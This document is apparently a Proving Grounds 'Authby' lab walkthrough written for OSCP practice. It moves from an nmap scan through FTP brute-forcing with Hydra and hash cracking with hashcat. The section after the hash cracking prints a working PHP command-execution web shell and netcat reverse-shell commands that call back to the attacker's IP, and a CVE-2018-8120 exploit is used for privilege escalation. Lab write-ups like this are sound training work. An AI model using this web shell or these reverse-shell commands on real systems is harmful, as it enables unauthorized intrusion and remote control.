#### Mind Map

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/rooted202111141710.png)

#### Enumeration

```
# Nmap 7.91 scan initiated Mon Nov  8 07:23:31 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Authby/AutoRecon/results/192.168.80.46/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Authby/AutoRecon/results/192.168.80.46/scans/xml/_full_tcp_nmap.xml 192.168.80.46
Nmap scan report for 192.168.80.46
Host is up, received user-set (0.30s latency).
Scanned at 2021-11-08 07:23:32 EST for 709s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT     STATE SERVICE            REASON          VERSION
21/tcp   open  ftp                syn-ack ttl 127 zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Nov 08 20:20 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Jul 26 21:51 accounts
242/tcp  open  http               syn-ack ttl 127 Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin         syn-ack ttl 127 zFTPServer admin
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 127
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2021-11-08T12:33:18+00:00
| ssl-cert: Subject: commonName=LIVDA
| Issuer: commonName=LIVDA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-06-03T21:15:17
| Not valid after:  2021-12-03T21:15:17
| MD5:   bb3f f979 9fc1 9d02 baa7 d0a4 9ccb 0922
| SHA-1: d0a1 8a6a 8326 1123 85f2 59e3 71ea c66c f3a4 048f
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQGttsFTOC+IFFUDrl75tnVzANBgkqhkiG9w0BAQUFADAQ
| MQ4wDAYDVQQDEwVMSVZEQTAeFw0yMTA2MDMyMTE1MTdaFw0yMTEyMDMyMTE1MTda
| MBAxDjAMBgNVBAMTBUxJVkRBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAw5XIXz8iD9nH+yWmmm8qL9mhTX2ePktQVr8V+9pejC7+QnNWIBRiQgn1n24f
| LXtl9fWPICyoHMRlMzPYZXddHGgFU8ld7UwJs2q5/egKfKE25T0Qp6GN8KesIzkn
| un0mIJY7eEx+U+KbjH6Yh7607bGmy3Mjpa18WqwF+i2WWBF8bXDvuZPkcWP2YWBQ
| 01LoDtUFGJ0KeCFIHFe5eCsREFkYKkqLhvGCYPl3EYKVY3Av2VE8VUtf2HadzF1s
| LBlefoT3p26bKr4guGhXUk8EXSNfHZAMl9mGlGX11A4RpVx/gna4Lx/elUYnfLNP
| oSVwjm2I4M/cQyeWXK670acSTwIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAHGQtYLWjpu4Mebquf3u
| xfUqqlq+012JEgM2W2j/ny/ax71gMxKa2jr6bWWhfN8j2cNe0tEsJYmaHsiq12l9
| OnOiJ6pSq9HBSp8lycCZ6uyXmPfcYYMuurcAf0dvUjBVbNr7vt74DogaJUzM7HH+
| Do+r1PIODTQdPPiBS+Ygmx1tyStwnMIg47WHslB5L22t31xruDx83l2BzUftdbPB
| /xy1v6LqHhKR/1JPVVbad5dGBJT5nZqPSM2NS6OmiUyZlZbvkLQo8WOnHgq7fSHu
| ylD3NdGLQzpIV6R6tzkY/Gw8gWLH3pFCppgxL7nsnYltPYPDqhT7WHudKsS6CrYC
| 3Ws=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-11-08T12:33:24+00:00; -1m55s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=11/8%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61891989%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10C%TI=I%II=I%SS=S%TS=7)
OPS(O1=M54ENW8ST11%O2=M54ENW8ST11%O3=M54ENW8NNT11%O4=M54ENW8ST11%O5=M54ENW8ST11%O6=M54EST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M54ENW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.021 days (since Mon Nov  8 07:04:30 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1m55s, deviation: 0s, median: -1m55s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   304.14 ms 192.168.49.1
2   304.23 ms 192.168.80.46

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov  8 07:35:21 2021 -- 1 IP address (1 host up) scanned in 711.76 seconds

```

We access ftp with anonymous account and the folder contains three zftp account files.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_12h14m33s_001_.png)

I create a text file named users.txt and add usernanmes ```admin``` and ```offsec``` to each line.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_14h38m52s_002_.png)

Brute force attack with Hydra to obtain credentials. (I learned not to use rockyou.txt in the first place. You can try smaller dictionary files first.)

```
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -t 20 -s 21 -f 192.168.73.46 ftp
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_14h42m07s_003_.png)

We log in to with admin account and download all the three files. The .htpasswd file stores username and password.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_14h49m19s_004_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h05m44s_005_.png)

Use hashcat to crack the apache md5 hash code and we get the recovery password ```elite```. ([hashcat -m {Hash-Mode}](https://hashcat.net/wiki/doku.php?id=example_hashes))

```
echo '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > hash
hashcat -m 1600 hash -a 0 /usr/share/wordlists/rockyou.txt --force
```
![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h10m18s_006_.png)

We use credential to pass HTTP authentication.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h21m10s_007_.png)

Now let's go back to the ftp directory, which looks like the root of the site.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h24m49s_008_.png)

We upload a php file that can execute system commands via system function. (Many php web sehlls do not work properly.) 

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h30m51s_009_.png)

Upload the netcat execution file via ftp.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h35m33s_010_.png)

Execute the command ```nc.exe -e cmd.exe 192.168.49.73 80``` to get the shell.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h38m12s_011_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h38m30s_012_.png)

Check the privileges. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h40m27s_013_.png)

#### Privilege Escalation

The target pc runs an old version os and no patched, so we can try to exploit kernel vulnerabilities.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h59m42s_014_.png)

After searching for a while I found the vulnerability [CVE-2018-8120](https://github.com/unamer/CVE-2018-8120) working.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h25m38s_015_.png)

We upload x86 version execution file and execute the netcat command ```nc.exe -e cmd.exe 192.168.49.73 3145```.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h44m50s_016_.png)

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h45m09s_017_.png)
